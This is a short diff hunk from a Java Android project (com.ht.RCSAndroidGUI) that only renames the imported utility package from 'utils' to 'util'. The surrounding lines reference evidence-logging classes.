@@ -28,8 +28,8 @@ import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.evidence.Evidence;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
-import com.ht.RCSAndroidGUI.utils.Utils;
-import com.ht.RCSAndroidGUI.utils.WChar;
+import com.ht.RCSAndroidGUI.util.Utils;
+import com.ht.RCSAndroidGUI.util.WChar;
 
 // TODO: Auto-generated Javadoc
 /**
